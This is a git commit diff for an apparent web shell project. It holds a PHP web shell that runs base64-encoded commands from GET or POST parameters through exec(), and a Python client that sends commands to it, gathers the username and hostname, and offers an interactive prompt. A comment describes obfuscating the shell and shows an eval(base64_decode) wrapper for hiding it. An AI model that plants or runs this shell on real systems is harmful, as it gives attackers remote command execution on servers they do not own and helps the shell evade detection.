ea38b4ed0c62ab4e3bceaeae5210f7abaf477a63
doyler <dev@doyler.net>
2017-04-25 16:36:06 -0400

    Removed encoded, added some methods to client, added support for POST requests

--- client.py
+++ client.py
@@ -5,16 +5,46 @@ import requests
 import string
 import base64
 
+def encodeRequest(command, encoding):
+    if encoding == "base64":
+        command = base64.b64encode(command)
+    else:
+        print "Only Base64 is currently supported"
+    return command
+
+def decodeResponse(response, encoding):
+    if encoding == "base64":
+        # http://stackoverflow.com/questions/2941995/python-ignore-incorrect-padding-error-when-base64-decoding
+        missing_padding = len(response) % 4
+        if missing_padding != 0:
+            response += b'='* (4 - missing_padding)
+        response = base64.decodestring(response)
+    else:
+        print "Only Base64 is currently supported"
+    return response
+
+def sendRequest(session, method, url, param, command):
+    if method == "get":
+        r = session.get(url, params={param: command})
+    elif method == "post":
+        r = session.post(url, data={param: command})
+    else:
+        print "Only GET and POST are currently supported"
+    return r
+
 def main():
     session = requests.Session()
     session.trust_env = False
      
+    # Configuration values
     ip = "127.0.0.1"
-    port = "8081"
+    port = "8123"
     filename = "shell.php"
+    method = "post"  # alternate is get
+    encoding = "base64"  # only supported algorithm for now
+    param = "cmd"
     
     print filename
-    param = "cmd"
     
     url = "http://" + ip + ":" + port + "/" + filename
     
@@ -22,17 +52,17 @@ def main():
     print "    " + url
     
     print "\n[*] Obtaining username."
-    
-    r = session.get(url, params={param: base64.b64encode("whoami")})
-    username = base64.b64decode(r.text)
+
+    r = sendRequest(session, method, url, param, encodeRequest("whoami", encoding))
+    username = decodeResponse(r.text, encoding)
     
     if "\\" in username:
         username = username.split("\\",1)[1]
         
     print "\n[*] Obtaining hostname."
     
-    r = session.get(url, params={param: base64.b64encode("hostname")})
-    hostname = base64.b64decode(r.text)
+    r = sendRequest(session, method, url, param, encodeRequest("hostname", encoding))
+    hostname = decodeResponse(r.text, encoding)
     
     print "\n[+] Returning prompt!\n\n"
     
@@ -43,9 +73,8 @@ def main():
                 print "\n\n[-] EXITING\n"
                 return
             else:
-                encoded = base64.b64encode(cmd)
-                r = session.get(url, params={param: encoded})
-                print base64.b64decode(r.text) + "\n"
+                r = sendRequest(session, method, url, param, encodeRequest(cmd, encoding))
+                print decodeResponse(r.text, encoding) + "\n"
     except KeyboardInterrupt:
         print "\n\n\n[-] EXITING\n"
         return
--- shell.php
+++ shell.php
@@ -1,7 +1,14 @@
 <?php
 	$result = array();
 	$output = "";
-	exec(base64_decode($_GET['cmd']), $result, $return);
+	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    	exec(base64_decode($_POST['cmd']), $result, $return);
+	}
+	else
+	{
+		exec(base64_decode($_GET['cmd']), $result, $return);
+	}
+
 	if (count($result) > 1) {
 		foreach($result as $line) {
 			$output = $output . $line . PHP_EOL;
@@ -13,4 +20,19 @@
 	{
 		echo base64_encode($result[0]);
 	}
+
+
+/*
+ * Encoded using mobilefish Simple online PHP obfuscator - http://www.mobilefish.com/services/php_obfuscator/php_obfuscator.php
+ * Original file = 289 characters
+ * All nested functions selected
+ * 3 random loops through the nested functions
+ * Decoded output @ UnPHP = https://www.unphp.net/decode/cbfb8525fd5f07272c03ce58c9324ffd/
+ * 
+ * Removed example, but here is a possible for encoding the webshell
+ *
+ *
+ * eval(base64_decode('goeshere'));
+ */
+
 ?>
